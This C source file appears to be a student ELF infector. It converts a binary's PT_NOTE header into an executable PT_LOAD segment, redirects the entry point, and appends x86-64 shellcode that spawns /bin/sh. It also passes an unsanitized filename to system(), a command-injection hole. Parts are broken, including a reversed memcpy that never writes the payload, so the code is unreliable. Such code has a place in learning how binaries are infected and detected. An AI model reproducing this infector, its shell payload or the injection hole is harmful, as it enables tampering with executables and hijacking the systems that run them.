#include "../includes/includes.h"
#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_bytes_as_hex(const void *data, size_t n) {
    const unsigned char *bytes = (const unsigned char *)data;
    for (size_t i = 0; i < n; i++) {
        printf("%02x ", bytes[i]); // %02x formats as 2-digit hex, lowercase
    }
    printf("\n");
}

/* 
 * display functions needed:
 * read elf header 
 * read prgm_header & read_prgm_headers 
 * read section_header & read section_headers
 * */

void display_elf_header(const char *filename) {
    const char *command_start = "readelf -h ";
    size_t len = strlen(command_start) + strlen(filename) + 1;
    printf("len to allocate %ld\n", len);
    printf("filename %s\n", filename);
    char *command = malloc(len);
    memset(command, 0, len);
    strncat(command, command_start, strlen(command_start));
    strncat(command, filename, strlen(filename));

    dprintf(1, "command to run %s\n", command);
    system(command);
}

void display_program_header(Elf64_Phdr phdr) {
    printf("  Type:   0x%x\n", phdr.p_type);
    printf("  Offset: 0x%lx\n", phdr.p_offset);
    printf("  VAddr:  0x%lx\n", phdr.p_vaddr);
    printf("  PAddr:  0x%lx\n", phdr.p_paddr);
    printf("  Filesz: 0x%lx\n", phdr.p_filesz);
    printf("  Memsz:  0x%lx\n", phdr.p_memsz);
    printf("  Flags:  0x%x\n", phdr.p_flags);
    printf("  Align:  0x%lx\n", phdr.p_align);
    printf("\n");
}

void read_store_elf_header(const char *filename, t_woodyData *data) {
    data->fd = open(filename, O_RDONLY);
    if (data->fd == -1) {
        printf("Couldnt open filename %s\n", filename);
        exit(1);
    }
    ssize_t bytes_read = read(data->fd, &data->elf_hdr, sizeof(Elf64_Ehdr));
    if (bytes_read == -1 || bytes_read != sizeof(Elf64_Ehdr)) {
        printf("couldnt read %s correctly\n", filename);
        exit(1);
    }
}

Elf64_Phdr read_phdrs_store_ptnote(t_woodyData *data) {
    ssize_t bytes_read = 0;
    for (int i = 0; i < data->elf_hdr.e_phnum; i++) {
        Elf64_Phdr current;
        int offset = data->elf_hdr.e_phoff + i * data->elf_hdr.e_phentsize;
        lseek(data->fd, offset, SEEK_SET);
        memset(&current, 0, sizeof(Elf64_Phdr));
        bytes_read = read(data->fd, &current, data->elf_hdr.e_phentsize);
        if (bytes_read != data->elf_hdr.e_phentsize) {
            printf("Couldnt read program headers correctly\n");
            exit(1);
        }
        if (current.p_type == 0x4) {
            data->offset_ptnote = offset; 
            printf("pt_note found\n");
            return current;
        }
    }
    printf("Fatal, didnt find any PT_Note program header");
    exit(1);
}

t_woodyData read_store_headers(const char *filename) {
    t_woodyData data;

    memset(&data, 0, sizeof(t_woodyData));
    read_store_elf_header(filename, &data);
    data.pt_note = read_phdrs_store_ptnote(&data);
    printf("pt note saved equals to \n");
    display_program_header(data.pt_note);

    return data;
}

void change_pt_note(t_woodyData *data) {
    memcpy(&data->pt_load, &data->pt_note, sizeof(Elf64_Phdr));

    data->pt_load.p_type = 1; // pt_note to pt_load en changeant type
    data->pt_load.p_flags = PF_X | PF_W | PF_R; // pt_note to pt_load en changeant type
    // the tricky part for offset

    

    // data->pt_load.p_vaddr = 0xc000000 + data->file_size;
    data->pt_load.p_vaddr = 0xffff +  data->file_size;
    data->new_entrypoint = (void *)data->pt_load.p_vaddr;
    data->pt_load.p_filesz += data->payload_size; 
    data->pt_load.p_memsz += data->payload_size; 
}

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

void write_file(t_woodyData *data) {
    lseek(data->fd, 0, SEEK_SET); // on repart au debut du fichier
    int fd_out = open("output", O_WRONLY | O_CREAT | O_TRUNC | O_APPEND, 0644);
    if (fd_out < 2) {
        perror("could not open file\n");
        exit(1);
    }
    char *output = malloc(data->file_size + PAYLOAD_SIZE + 1);
    if (output == NULL) {
        perror("output malloc failed\n");
        exit(1);
    }
    memset(output, 0, data->file_size + PAYLOAD_SIZE + 1);
    dprintf(1, "malloced\n");
    ssize_t bytes_read = read(data->fd, output, data->file_size);
    if (bytes_read != data->file_size) {
        perror("read issue\n");
        exit(1);
    }
    dprintf(1, "red %ld \n", bytes_read);

    memcpy(&output[0x18], &data->new_entrypoint, sizeof(void *));
    memcpy(&output[data->offset_ptnote], &data->pt_load, sizeof(Elf64_Phdr));
    memcpy(&code, &output[data->file_size], 27);

    write(fd_out, output, data->file_size + PAYLOAD_SIZE);

    dprintf(1, "written\n");
}

void infect_file(const char *filename) {
    t_woodyData data = read_store_headers(filename); 
    data.file_size = lseek(data.fd, 0, SEEK_END); // on recup la taille du fichier
    data.payload_size = PAYLOAD_SIZE; // for now its whatever
    change_pt_note(&data);
    write_file(&data);
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("Wrong number of args\n");
        return EXIT_FAILURE;
    }
    infect_file(argv[1]);

    return EXIT_SUCCESS;
}
